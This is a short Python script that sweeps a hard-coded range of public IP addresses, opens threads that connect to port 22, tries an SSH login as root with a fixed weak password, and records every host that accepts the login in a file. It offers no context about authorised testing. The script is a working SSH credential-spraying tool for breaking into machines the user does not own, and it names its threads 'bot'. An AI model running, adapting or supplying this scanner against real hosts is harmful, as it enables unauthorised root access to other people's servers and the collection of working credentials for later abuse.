# /usr/bin/python
# -*- coding: utf-8 -*-

import socket
import paramiko
import threading


# Saving valid resources in the file
def save_data(data):
    with open("valid.txt", "a") as f:
        f.write(data)


# Generating ip list from ip range
def generate_hosts(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []

    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
        ip_range.append(".".join(map(str, temp)))

    return ip_range


# Running check to open port and start threads
class Worker(threading.Thread):
    def __init__(self, ip, port, username, password):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password

    def run(self):
        self.check()

    def check(self):
        try:
            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cli.settimeout(5)
            cli.connect((self.ip, self.port))
            # banner = cli.recv(1024)
            # print("[INFO] %s\t%s"% (self.ip, banner))
            self.login()
        except Exception as e:
            pass
            # print("[ERROR] %s\t%s"% (self.ip, e))

    def login(self):
        try:
            ssh_cli = paramiko.SSHClient()
            ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_cli.connect(self.ip, port=self.port, username=self.username, password=self.password)
            save_data("%s:%s:%s\n"% (self.ip, self.username, self.password))
            ssh_cli.close()
        except Exception:
            print("[ERROR] Login failure to %s"% self.ip)



def main():
    ip_range = generate_hosts("64.40.128.1", "64.40.128.254")
    for ip in ip_range:
        bot = Worker(ip, 22, "root", "r00t")
        bot.start()


if __name__ == '__main__':
    main()